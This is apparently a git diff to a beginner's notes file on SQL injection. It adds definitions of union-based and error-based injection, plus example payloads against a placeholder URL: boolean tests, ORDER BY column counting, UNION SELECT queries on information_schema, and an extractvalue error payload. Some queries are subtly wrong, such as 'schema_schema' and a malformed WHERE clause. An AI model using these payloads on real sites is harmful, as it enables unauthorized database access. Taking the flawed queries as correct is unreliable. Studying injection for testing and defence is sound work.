@@ -4,7 +4,9 @@ SQLi is a server side web security vulnerability.SQLi occurs when user supplied 
 
 Union based SQL Injection
 =========================
- 
+union base SQLI is a in band type SQLI in which the user supplied data is passes in the select statement after where clause.
+And when the sql querry result is shown on the web application.
+
 Let's assume, vulnerable URL is:
 
      http://b0x.com/vulnerable.php?id=1
@@ -20,7 +22,12 @@ Let's assume, vulnerable URL is:
      
      http://b0x.com/vulnerable.php?id=1' and 1='1
      http://b0x.com/vulnerable.php?id=1' and 1='2     
-4. Finding columns
+4. Finding columns 
+      
+       http://b0x.com/vulnerable.php?id=1' order by 1,2,3,4  
+    
+    when the error shown as "unknown column" then the one less count no. will be total number of columns.
+
 5. Invalidating output of first query.
 6. Using union select 1,2 — -  ——>Union select 1,table_name,3 from information_schema.tables where table_schema=‘mysql’ table_name=‘user’
 
@@ -40,10 +47,11 @@ To find column name from specify table of current database
 
 <b>Finding the list of databases</b>
 
-Select group_concat(schema_schema) from information_schema.schemata
+      Select group_concat(schema_schema) from information_schema.schemata
 
 Error based SQL Injection
 =========================
+Errorbase SQLI is a inband SQLi in which web application is throwing SQL server error.
 
 ->and extractvalue(1,concat(0x7e,user()))
 
